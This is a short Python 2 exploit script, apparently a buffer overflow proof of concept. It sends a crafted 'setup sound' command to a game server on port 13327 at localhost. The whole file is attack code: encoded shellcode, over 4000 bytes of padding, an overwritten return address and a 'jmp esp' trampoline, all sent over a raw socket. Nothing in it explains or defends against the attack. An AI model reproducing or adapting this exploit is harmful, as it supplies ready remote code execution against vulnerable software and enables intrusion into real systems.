
#!/usr/bin/python
import socket

host="127.0.0.1"
shellcode=(
"\xba\x96\x4f\x17\x1a\xda\xd6\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x14\x83\xc3\x04\x31\x53\x10\x03\x53\x10\x74\xba\x26\xc1\x8f"
"\xa6\x1a\xb6\x3c\x43\x9f\xb1\x23\x23\xf9\x0c\x23\x1f\x58\xdd"
"\x4b\xa2\x64\xf0\xd7\xc8\x74\xa3\xb7\x85\x94\x29\x51\xce\x9b"
"\x2e\x14\xaf\x27\x9c\x22\x80\x4e\x2f\xaa\xa3\x3e\xc9\x67\xa3"
"\xac\x4f\x1d\x9b\x8a\xa2\x61\xaa\x53\xc5\x09\x02\x8b\x46\xa1"
"\x34\xfc\xca\x58\xab\x8b\xe8\xca\x60\x05\x0f\x5a\x8d\xd8\x50")
# 0x83C00C add eax, 12
# 0xFFE0   jmp esp
# 0x90     nop
crash=shellcode + "\x41" * 4263 + "\x96\x45\x13\x08" + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"

buffer="\x11(setup sound " + crash + "\x90\x00#"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[*] Sending evil buffer..."

s.connect((host, 13327))
s.send(buffer)
data=s.recv(1024)
print data
s.close()

print "[*] Payload sent!"


